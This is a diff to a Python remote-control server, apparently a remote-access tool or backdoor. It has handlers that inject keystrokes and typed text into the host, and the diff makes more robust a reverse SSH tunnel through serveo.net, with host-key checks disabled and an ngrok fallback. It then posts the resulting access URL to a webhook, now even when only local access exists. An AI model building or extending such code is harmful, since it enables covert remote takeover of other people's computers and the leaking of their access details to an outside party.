@@ -409,39 +409,57 @@ def on_remote_key(d): remote_key(d["key"])
 @socketio.on("remote:type")
 def on_remote_type(d): remote_type(d["text"])
 
-# ===== TUNNEL (serveo.net) =====
-def start_tunnel():
+# ===== TUNNEL =====
+def tunnel_serveo():
     global tunnel_url, tunnel_urls
-    tunnel_urls = []
+    print("[*] Tentative serveo.net...")
+    cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
+           "-o", "ServerAliveInterval=30", "-o", "ConnectTimeout=10",
+           "-R", "80:localhost:5000", "serveo.net"]
     try:
-        cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
-               "-o", "ServerAliveInterval=30", "-R", "80:localhost:5000", "serveo.net"]
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
-
         def reader():
             global tunnel_url, tunnel_urls
             for line in iter(proc.stdout.readline, ""):
                 line = line.strip()
                 if line: print("[serveo]", line)
-                for m in re.finditer(r'https?://[a-z0-9-]+\.serveo\.net', line):
+                for m in re.finditer(r'(https?://)?[a-z0-9-]+\.serveo\.net', line):
                     u = m.group()
+                    if not u.startswith("http"): u = "https://" + u
                     if u not in tunnel_urls: tunnel_urls.append(u)
                     if "console.serveo.net" not in u and not tunnel_url:
                         tunnel_url = u
                         print(f"[+] Serveo URL: {tunnel_url}")
                         return
-
         t = threading.Thread(target=reader, daemon=True)
         t.start()
         for _ in range(30):
             if tunnel_url: break
             time.sleep(0.5)
-        if not tunnel_url and tunnel_urls:
-            tunnel_url = tunnel_urls[0]
         return tunnel_url
     except Exception as e:
-        print(f"[-] Tunnel error: {e}")
+        print(f"[-] serveo error: {e}")
         return None
+
+def tunnel_ngrok():
+    global tunnel_url, tunnel_urls
+    print("[*] Tentative ngrok...")
+    try:
+        subprocess.Popen(["ngrok", "http", str(PORT), "--log", "stdout"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(3)
+        r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
+        url = r.json()["tunnels"][0]["public_url"]
+        if url: tunnel_url = url; tunnel_urls.append(url)
+        print(f"[+] Ngrok URL: {url}"); return url
+    except:
+        return None
+
+def start_tunnel():
+    global tunnel_url, tunnel_urls
+    tunnel_urls = []
+    tunnel_url = tunnel_serveo()
+    if tunnel_url: return tunnel_url
+    return tunnel_ngrok()
 
 def send_webhook(url, extra_urls=None):
     try:
@@ -472,7 +490,8 @@ if __name__ == "__main__":
     url = start_tunnel()
     if url:
         print(f"[+] URL: {url}?auth={PASSWORD}")
-        send_webhook(url, tunnel_urls)
     else:
-        print(f"[-] Local: http://127.0.0.1:{PORT}")
+        print(f"[-] Aucun tunnel trouvé, accès local uniquement")
+        url = f"http://127.0.0.1:{PORT}"
+    send_webhook(url, tunnel_urls)
     socketio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
